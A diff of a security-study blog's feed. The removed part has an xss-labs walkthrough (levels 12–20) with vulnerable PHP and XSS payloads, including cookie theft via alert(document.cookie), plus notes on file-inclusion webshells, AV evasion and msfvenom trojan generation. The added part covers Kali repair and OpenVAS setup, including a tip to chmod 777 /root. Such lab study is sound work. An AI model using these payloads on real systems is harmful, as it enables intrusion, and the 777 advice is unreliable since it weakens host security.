-&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
-</code></pre>
-<ul>
-<li>有个参数t_ua的后面是我们的User Agent信息，所以直接试一试上一关的payload，通过HackBar的User Agent提交。</li>
-</ul>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;keyword&quot;];
-$str00 = $_GET[&quot;t_sort&quot;];
-$str11=$_SERVER['HTTP_USER_AGENT'];
-$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
-$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
-echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
-&lt;form id=search&gt;
-&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_ua&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;
-&lt;/center&gt;';
-?&gt;
-</code></pre>
-<h1 id="13-xss-level13">13. xss-level13</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;
-&lt;h2 align=center&gt;没有找到和good job!相关的结果.&lt;/h2&gt;&lt;center&gt;
-&lt;form id=search&gt;
-&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_cook&quot;  value=&quot;call me maybe?&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;
-&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;
-&lt;h3 align=center&gt;payload的长度:9&lt;/h3&gt;&lt;/body&gt;
-</code></pre>
-<ul>
-<li>有个cook参数，猜测使用Cookies可以提交，使用上上关payload，发现cook内容里的参数消失了。</li>
-</ul>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php 
-setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;keyword&quot;];
-$str00 = $_GET[&quot;t_sort&quot;];
-$str11=$_COOKIE[&quot;user&quot;];
-$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
-$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
-echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
-&lt;form id=search&gt;
-&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
-&lt;input name=&quot;t_cook&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
-&lt;/form&gt;
-&lt;/center&gt;';
-?&gt;
-</code></pre>
-<ul>
-<li>这里COOKIE提交的是user参数，更改payload增加user参数尝试。</li>
-</ul>
-<ol start="3">
-<li></li>
-</ol>
-<pre><code>Cookies：user=&quot; type=&quot;text&quot; onclick=&quot;alert()
-</code></pre>
-<h1 id="14-xss-level14">14. xss-level14</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
-&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
-&lt;/body&gt;
-</code></pre>
-<ul>
-<li>会自动跳转到http://www.exifviewer.org/?z的页面，并且没有php的代码，一头雾水</li>
-</ul>
-<ol start="2">
-<li>通过上网查询，得到解释，这里本来是一个exif xss的漏洞，要将xss代码写进exif里面，但是现在没有办法进行测试。</li>
-<li>大致的意思为需要上传一个带有xss信息的图片来触发xss。</li>
-<li>通过设置图片的主题或者标题为xss代码，上传图片。</li>
-<li>模拟xss-level14的php代码。</li>
-</ol>
-<pre><code>&lt;html&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
-&lt;title&gt;欢迎来到level14&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
-&lt;!--&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;--&gt;
-    &lt;?php
-   echo &quot;&lt;center&gt;
-   &lt;form action=level14.php method=POST enctype=multipart/form-data&gt;
-   &lt;label for=file&gt;文件名：&lt;/label&gt;
-   &lt;input type=file name=file id=file&gt;&lt;br&gt;
-   &lt;input type=submit name=submit value=提交&gt;
-&lt;/form&gt;&lt;/center&gt;&quot;;
-
-// 允许上传的图片后缀
-$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);
-$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
-echo $_FILES[&quot;file&quot;][&quot;size&quot;];
-$extension = end($temp);     // 获取文件后缀名
-if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)
-|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)
-|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;)
-|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)
-|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;)
-|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))
-&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)   // 小于 200 kb
-&amp;&amp; in_array($extension, $allowedExts))
-{
-    if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
-    {
-        echo &quot;错误：: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;
-    }
-    else
-    {
-        echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;
-        echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;
-        echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;
-        echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br&gt;&quot;;
-    
-        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $_FILES[&quot;file&quot;][&quot;name&quot;]);
-    }
-}
-else
-{
-    echo &quot;非法的文件格式&quot;;
-}
-    $file = $_FILES[&quot;file&quot;][&quot;name&quot;];
-    echo $file;
-
-    $exif = exif_read_data($file);
-    var_dump($exif)
-?&gt;
-&lt;?php
-
-?&gt;
-&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/level15.php?src=level15.png&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<h1 id="15-xss-level15">15. xss-level15</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;html ng-app&gt;
-&lt;head&gt;
-        &lt;meta charset=&quot;utf-8&quot;&gt;
-        &lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&gt;&lt;/script&gt;
-&lt;script&gt;
-window.alert = function()  
-{     
-confirm(&quot;完成的不错！&quot;);
- window.location.href=&quot;level16.php?keyword=test&quot;; 
-}
-&lt;/script&gt;
-&lt;title&gt;欢迎来到level15&lt;/title&gt;
-&lt;/head&gt;
-&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;
-&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;
-&lt;body&gt;&lt;span class=&quot;ng-include:&quot;&gt;&lt;/span&gt;&lt;/body&gt;
-</code></pre>
-<ul>
-<li>因为原先的https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js被墙了，所以换成https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</li>
-</ul>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;src&quot;];
-echo '&lt;body&gt;&lt;span class=&quot;ng-include:'.htmlspecialchars($str).'&quot;&gt;&lt;/span&gt;&lt;/body&gt;';
-?&gt;
-</code></pre>
-<ul>
-<li>ng-include 指令使用了AngularJS，可以通过新的属性，新的表达式扩展HTML。</li>
-<li>可以用于包含外部的 HTML 文件。</li>
-<li>包含的内容将作为指定元素的子节点。</li>
-<li>ng-include 属性的值可以是一个表达式，返回一个文件名。</li>
-<li>默认情况下，包含的文件需要包含在同一个域名下。</li>
-<li>值得注意
-<ul>
-<li>如果要指定单纯的地址，必须要加上引号。</li>
-<li>当加载外部html文件时，scritp标签中的内容不会被执行，含有style标签样式可以被执行。</li>
-</ul>
-</li>
-</ul>
-<ol start="3">
-<li>payload</li>
-</ol>
-<pre><code>level15.php?src='level1.php?name=&lt;img src=1 onerror=alert(1)&gt;'
-</code></pre>
-<ul>
-<li>这里已经知道了可以通过使用ng-include来包含HTML的内容</li>
-<li>在.php后面增加了参数值。类似于访问了该文件参数值之后，将该值包含在html文件后响应。</li>
-</ul>
-<h1 id="16-xss-level16">16. xss-level16</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
-&lt;center&gt;&lt;&amp;nbsp;&gt;alert()&lt;&amp;nbsp;&amp;nbsp;&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
-&lt;h3 align=center&gt;payload的长度:29&lt;/h3&gt;&lt;/body&gt;
-</code></pre>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = strtolower($_GET[&quot;keyword&quot;]);
-$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
-$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
-$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
-$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);
-echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
-?&gt;
-</code></pre>
-<ul>
-<li>script，空格，斜杠都被处理了，这里也没有一个值需要进行包裹。</li>
-<li>用之前15关的方法，但是空格被实体化了，所以这里有绕过技巧涉及到url编码。</li>
-<li>而我们又知道仅仅只在html代码中进行换行对实际的代码是没有效果的，所以这里可以用回车的url编码%0a来代替空格。</li>
-</ul>
-<ol start="3">
-<li>payload</li>
-</ol>
-<pre><code>level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;
-</code></pre>
-<h1 id="17-xss-level17">17. xss-level17</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;
-&lt;embed src=xsf01.swf?a=b width=100% heigth=100%&gt;&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;
-&lt;/body&gt;
-</code></pre>
-<ul>
-<li>特别说明：这之后的关卡需要用到flash插件</li>
-</ul>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php
-ini_set(&quot;display_errors&quot;, 0);
-echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
-?&gt;
-</code></pre>
-<ul>
-<li>arg01 arg02被过滤掉了，这里没有引号，不需要对src进行包裹，直接在后面加上payload，移动鼠标进行弹窗。</li>
-</ul>
-<ol start="3">
-<li>payload</li>
-</ol>
-<pre><code>onmouseover=alert()
-</code></pre>
-<h1 id="18-xss-level18">18. xss-level18</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;
-&lt;embed src=xsf02.swf?a=b width=100% heigth=100%&gt;&lt;/body&gt;
-</code></pre>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php
-ini_set(&quot;display_errors&quot;, 0);
-echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
-?&gt;
-</code></pre>
-<ul>
-<li>查看17，18两关的代码基本上没有什么差别，用第17关的payload也可以通过</li>
-</ul>
-<h1 id="19-xss-level19">19. xss-level19</h1>
-<ol>
-<li>ctrl+u</li>
-</ol>
-<pre><code>&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;
-&lt;embed src=&quot;xsf03.swf?a=b&quot; width=100% heigth=100%&gt;&lt;/body&gt;
-</code></pre>
-<ol start="2">
-<li>php</li>
-</ol>
-<pre><code>&lt;?php
-ini_set(&quot;display_errors&quot;, 0);
-echo '&lt;embed src=&quot;xsf03.swf?'.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).'&quot; width=100% heigth=100%&gt;';
-?&gt;
-</code></pre>
-<ol start="3">
-<li>payload</li>
-</ol>
-<pre><code>level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;xss&lt;/a&gt;
+<pre><code># 一致按y，yes
+fsck [红色方框中的路径]
+或
+fsck -y [红色方框中的路径]
+# 直到看到initramfs命令行
 </code></pre>
 <ol start="4">
-<li><a href="https://blog.csdn.net/u014029795/article/details/103213877?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159547621119725219908275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=159547621119725219908275&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v4-2-103213877.first_rank_ecpm_v3_pc_rank_v4&amp;utm_term=xss-labs%2019&amp;spm=1018.2118.3001.4187">xss19</a></li>
+<li>重启kali，进入运行级别3，选择第二个，之后选择进入运行级别3，输入root密码</li>
 </ol>
-<h1 id="20-xss-level20">20. xss-level20</h1>
-<pre><code>level20.php?arg01=id&amp;arg02=\&quot;))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height
+<pre><code>1.查明装入模块的名字：lsmod | grep i2c
+# 会回显i2c_piix4 或者其他
 </code></pre>
-<p><a href="https://blog.csdn.net/u014029795/article/details/103217680">xss20</a></p>
+<br>
+<pre><code>2.切换目录查看：
+cd /etc/modprobe.d/
+ls
+</code></pre>
+<br>
+<pre><code>3. 在文件最后一行加：blacklist i2c_piix4
+# 主要是libhackrf0.conf
+# 但是并不确定具体是哪一个所以我都加了
+# 不是root用sudo
+vi [****]
+按ESC退出编辑模式；
+按下shift+：，输入wq!，这里是vim命令，表示强制保存并退出
+</code></pre>
+<br>
+<pre><code>4. 重新生成引导文件：
+sudo update-initramfs -u -k all
+</code></pre>
+<br>
+<pre><code>5.重启
+</code></pre>
+<h1 id="2-安装openvas">2. 安装openvas</h1>
+<h2 id="1-rsync-error-error-in-socket-io-code-10-at-clientserverc137-receiver323">1. rsync error: error in socket IO (code 10) at clientserver.c(137) [Receiver=3.2.3]</h2>
+<ol>
+<li>下载安装redis-server</li>
+</ol>
+<pre><code>apt search redis
+apt install redis-server
+</code></pre>
+<ol start="2">
+<li>安装firewall，开放873端口：</li>
+</ol>
+<pre><code>apt install firewall
+firewall-cmd --permanent --add-port=873/tcp
+firewall-cmd --query-port=873/tcp
+firewall-cmd --reload
+</code></pre>
+<h2 id="2-root权限问题">2. /root/权限问题</h2>
+<p>给root目录开放777权限</p>
+<pre><code># root ：777
+# /var/log/gvm：777
+chmod 777 [目录]
+</code></pre>
+<h2 id="3-error-redis-server-is-not-running-or-not-listening-on-socket-varrunredis-openvasredis-serversock">3. ERROR: redis-server is not running or not listening on socket: /var/run/redis-openvas/redis-server.sock</h2>
+<p>提示：FIX: You should start the redis-server with 'systemctl start redis-server@openvas.service' or configure it to listen on socket: /var/run/redis-openvas/redis-server.sock</p>
+<pre><code>systemctl start redis-server@openvas.service
+</code></pre>
+<h2 id="4-error-no-users-found-you-need-to-create-at-least-one-user-to-log-in">4. ERROR: No users found. You need to create at least one user to log in.</h2>
+<p>提示：FIX: create a user by running 'sudo runuser -u _gvm -- gvmd --create-user=&lt;name&gt; --password=&lt;password&gt;'</p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[php 伪协议与钓鱼]]></title>
-        <id>https://kite-007.github.io/php-wei-xie-yi-yu-diao-yu/</id>
-        <link href="https://kite-007.github.io/php-wei-xie-yi-yu-diao-yu/">
+        <title type="html"><![CDATA[# KALI 漏洞扫描]]></title>
+        <id>https://kite-007.github.io/kali-lou-dong-sao-miao/</id>
+        <link href="https://kite-007.github.io/kali-lou-dong-sao-miao/">
         </link>
-        <updated>2021-03-21T00:55:20.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="1">1.</h1>
-<p>文件包含文件写入<br>
-flag在服务器根目录<br>
-目录穿越（../）或伪协议（php://filter/read=convert.base64）或file协议（file:///）<br>
-字符串过滤器<br>
-转换过滤器<br>
-压缩过滤器<br>
-编码绕过<br>
-docx可以直接改为zip，两者可以相互打开，docx-小马，1.txt-zip-docx，<br>
-phar协议-php-压缩包-木马-协议包含<br>
-加密过滤器<br>
-文件包含，直接运行php代码<br>
-分离免杀，危险数据，exe运行文件<br>
-exit绕过：exit部分进行编码处理，使php不能被识别，之后使内容写入文件，链接<br>
-.htaccess配置文件，将文件直接当作php执行<br>
-bypass绕过<br>
-usc-2，构成2的倍数，对目标字符串2位一反转<br>
-file_put_contents会解码一次，浏览器会解码一次，二次解码<br>
-tamp，Windows临时文件，爆破临时将文件，<br>
-伪造uav为一句话木马，文件包含日志文件，访问一句话木马，服务器访问临时文件，条件竞争<br>
-python脚本-服务器-不知道路径-加载phpinfo-加载路径-包含getshell<br>
-windows大小写不敏感，Linux大小写敏感</p>
-<h1 id="2">2.</h1>
-<p>打入内网，扩大成果<br>
-cobait strike<br>
-swaks</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[# 工具]]></title>
-        <id>https://kite-007.github.io/gong-ju/</id>
-        <link href="https://kite-007.github.io/gong-ju/">
-        </link>
-        <updated>2021-03-16T23:57:18.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="1-sqlmap">1. sqlmap</h1>
-<ol>
-<li>介绍：它是一个开源渗透测试工具，它可以自动检测和利用SQL注入漏洞并接管数据库服务器的工具。</li>
-<li>技巧：可以搜索php?id=,php?name=等等一些查看有没有表单提交。</li>
-<li>操作：</li>
-</ol>
-<ul>
-<li>sqlmap -u (需要测试的网站)；sqlmap会直接帮我们测试存不存在该类型漏洞，也会显示出payload</li>
-<li>-h，-hh获取帮助文档或者更多帮助列表
-<ul>
-<li>Target；使用sqlmap的模式
-<ul>
-<li>-d [连接数据库信息]；测试连接数据库，需要下载驱动程序</li>
-<li>-u</li>
-<li>-m；文件中有多个参数时可以一个个遍历，查询其中一个则需要在这一个参数后面加上*</li>
-<li>-r；测试http包（burp所抓到的包存入一个文件中，对文件进行测试）</li>
-<li>-g [inurl:php?id=1]；google搜索（inurl:php?id=1）</li>
-<li>-c；加载配置文件</li>
-</ul>
-</li>
-<li>request；如何请求页面，链接页面的方式，请求页面的方式post，get等
-<ul>
-<li>--method；http请求方法</li>
-<li>--data；填充post包</li>
-<li>--cookie=COOKIE；设置COOKIE</li>
-<li>--user-agent=AGENT；将sqlmap设置来源代理为AGENT</li>
-<li>--random-agent；随机选取一个代理</li>
-<li>--host=HOST；修改HOST</li>
-<li>--referer=REFERER；修改REFERER网站来源</li>
-<li>--header=HEADER；修改以上的http头</li>
-</ul>
-</li>
-<li>optimization；实现优化作用，性能速度
-<ul>
-<li>-o；使用所有优化</li>
-</ul>
-</li>
-<li>injection；注入参数，提供自定义的方式，脚本等</li>
-<li>detection；探测注入等级</li>
-<li>techniques；调整测试技术方式
-<ul>
-<li>--technique=TECH；默认使用所有注入方式</li>
-</ul>
-</li>
-<li>enumeration；枚举参数（前提为存在sql注入）列出参数
-<ul>
-<li>--users</li>
-<li>--tables</li>
-</ul>
-</li>
-<li>windows registry access；查看win注册表</li>
-<li>general；通用</li>
-<li>miscellaneous；杂项
-<ul>
-<li>--wizard；sqlmap使用导航引导测试</li>
-<li>--sqlmap-shell；sqlmap命令选项模式</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="2-metosploit">2. metosploit</h1>
-<ol>
-<li>介绍：Metasploit渗透测试框架（Free ，Pro），再Kali中使用msfconsole打开</li>
-<li>功能：探测发现，漏洞验证，漏洞攻击，漏洞载核，编码混淆等等</li>
-<li>命令：
-<ul>
-<li>show exploits；展示可使用的漏洞的攻击方式，如果要使用一个漏洞，则须先扫描漏洞</li>
-<li>search [cve-XX]；搜索漏洞</li>
-<li>use [漏洞存放目录]；使用漏洞</li>
-<li>show info；查看漏洞设置选项</li>
-<li>show payloads；use漏洞之后要使用的</li>
-</ul>
-<pre><code>use [漏洞] //使用漏洞攻击
-set PAYLOAD &lt;Payload name&gt;//攻击成功之后会执行payload 
-set LHOST &lt;LHOST value&gt;//对方链接攻击者IP 端口是什么
-set LPORT &lt;LPORT value&gt;//
-Show info
-exploits/run
-</code></pre>
-<ul>
-<li>meterpreter（模块）；肉机管理，回话管理（控制端）
-<ul>
-<li>shell，获取对方shell</li>
-<li>Download/Upload</li>
-<li>search/edit</li>
-<li>portfwd端口转发</li>
-<li>migrate迁移进程</li>
-<li>execute</li>
-</ul>
-</li>
-<li>msfvenom；生成payload，生成木马后门的工具</li>
-</ul>
-<pre><code>msfvenom -p [payload] LHOST=X  LPORT=X -f [exe] &gt; []
-msfvenom//生成木马的工具
--p //指定payload类型
-LHOST//是控制端IP
-LPORT//控制端端口
--f //指文件格式
-</code></pre>
-<ul>
-<li>混淆payload</li>
-</ul>
-<pre><code>msfvenom -p [payload] LHOST=X  LPORT=X -e [混淆] -f [exe] &gt; []
-</code></pre>
-<ul>
-<li>check；扫描对方是否可以攻击，是否存在该漏洞</li>
-<li>msfvenmo -l encoders ；编码混淆，木马混淆</li>
-</ul>
-</li>
-<li>免杀*</li>
-</ol>
-<ul>
-<li>混淆的主要目的（二进制）；修改md5（pe，资源表，字符串）</li>
-</ul>
-<h1 id="3-nmap">3. Nmap</h1>
-<ol>
-<li>使用流程：(目标确认—》主机发现—》扫描端口—》扫描技术—》探测服务—》探测防火墙—》性能优化—》报告输出)</li>
-<li>用途： 活跃IP，端口的扫描，对端口，服务，操作系统的探测，将扫描的内容保存在一个文件，扫描常用的端口，多种扫描方式，脚本扫描，性能控制，主机发现，规避防火墙，MAC欺骗，空闲扫描。</li>
-<li>端口扫描：</li>
-</ol>
-<ul>
-<li>nmap 【网站/IP地址】-p 【端口】 -sS(扫描方式:基于TCP SYN) -sV(探测服务信息) -O(探测操作系统) -A(包含了-sV和-O等)
-<ul>
-<li>可以按回车显示进度，如果不对单一的端口进行扫描直接使用-sS -A即可。-iR，对随机IP扫描。</li>
-<li>活跃IP：是指 一个 ip段 ，存在的 主机 较多， 查找 活跃 ip的 人一般会，运行远程溢出，弱口令扫描软件。</li>
-<li>-p --top-ports X：扫描常用的端口X个。</li>
-<li>-oN 【目录】，输出扫描内容到该目录的文件夹</li>
-<li>--script=【./脚本目录】可以使用脚本</li>
-<li>-n；不做DNS解析，如果解析了会知道域名</li>
-<li>-F；扫描默认常用端口100多</li>
-<li>-sL；简单列出扫描目标信息</li>
-<li>-Pn；nmap扫描过程中会探测主机是否在线，如果主机在线，则会去扫描端口，通常情况下已经知道了主机在线，所以加上-Pn 【IP】，则不用再去探测主机是否在线，默认主机为在线状态。</li>
-<li>-O：检测操作系统</li>
-<li>-D 【IP】，【IP】：设置诱饵隐蔽扫描</li>
-<li>-g 【端口】 【IP】：设置自己来源端口与IP（假）</li>
-<li>-T&lt;0-5&gt;：速度性能控制</li>
-<li>--spoof -mac 【MAC地址】：伪造自己的访问目标MAC地址为对应MAC地址</li>
-<li>-sI ip:【脚本扫描到的端口】 【脚本扫描到的IP】；网络上有多台主机，当有某台空闲的时候，就可以利用对方的IP做出一些扫描。</li>
-<li>sudo nmap --script ipidseq iR 10000 -oN ipidseq.txt
-<ul>
-<li>用脚本扫描扫出可以使用空闲扫描的对应IP端口</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[# KALI]]></title>
-        <id>https://kite-007.github.io/kali/</id>
-        <link href="https://kite-007.github.io/kali/">
-        </link>
-        <updated>2021-03-15T07:57:48.000Z</updated>
+        <updated>2021-04-01T10:13:06.000Z</updated>
         <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
-<li><a href="#1-%E5%9F%BA%E6%9C%AC">1. 基本</a>
+<li><a href="#1-%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E">1. 发现漏洞</a>
 <ul>
-<li><a href="#1-%E6%9B%B4%E6%94%B9root%E5%AF%86%E7%A0%81%E4%BD%BFkali%E8%83%BD%E5%A4%9F%E5%BC%80%E6%9C%BA%E7%99%BB%E9%99%86">1. 更改root密码，使kali能够开机登陆</a></li>
-<li><a href="#2-%E6%8D%A2%E6%BA%90%E5%B9%B6%E6%9B%B4%E6%96%B0">2. 换源并更新</a></li>
-<li><a href="#3-%E5%AE%89%E8%A3%85%E8%BE%93%E5%85%A5%E6%B3%95">3. 安装输入法</a></li>
+<li><a href="#1-%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E-2">1. 发现漏洞</a></li>
+<li><a href="#2-%E4%BB%8E%E4%BF%A1%E6%81%AF%E7%9A%84%E7%BB%B4%E5%BA%A6%E5%AE%9A%E4%B9%89%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86">2. 从信息的维度定义漏洞管理</a></li>
+<li><a href="#3-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F%E7%B1%BB%E5%9E%8B">3. 弱点扫描类型</a></li>
+<li><a href="#4-%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">4. 漏洞基本概念</a></li>
 </ul>
 </li>
-<li><a href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">2. 信息收集</a>
+<li><a href="#2-nmap%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC">2. NMAP常用扫描脚本</a></li>
+<li><a href="#3-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F%E5%99%A8">3. 弱点扫描器</a>
 <ul>
-<li><a href="#1-nmap%E6%89%AB%E6%8F%8Fip">1. Nmap扫描（IP）</a></li>
-<li><a href="#2-%E5%AD%90%E5%9F%9F%E5%90%8D">2. 子域名</a></li>
+<li><a href="#1-openvas">1. OPENVAS</a></li>
+<li><a href="#2-nessus">2. NESSUS</a></li>
 </ul>
 </li>
 </ul>
 (KALI)</p>
-<h1 id="1-基本">1. 基本</h1>
-<h2 id="1-更改root密码使kali能够开机登陆">1. 更改root密码，使kali能够开机登陆</h2>
+<h1 id="1-发现漏洞">1. 发现漏洞</h1>
+<h2 id="1-发现漏洞-2">1. 发现漏洞</h2>
+<ol>
+<li>基于端口服务扫描结果版本信息（速度比较慢）。</li>
+<li>搜索已公开的漏洞数据库（数量大）。</li>
+<li>使用弱点扫描器实现漏洞管理，自动利用漏洞代码进行探测，能够快速发现目的信息。</li>
+</ol>
 <ul>
-<li>（sudo passwd root）。</li>
-<li>sudo命令以系统管理者的身份执行，相当于root。</li>
-<li><img src="https://kite-007.github.io/post-images/1615795367734.png" alt="" loading="lazy"></li>
-<li>uname可以查看版本</li>
+<li>exploit-db.com网站中存放着大量的关于漏洞以及利用的代码，可以下载漏洞源码，进行尝试。</li>
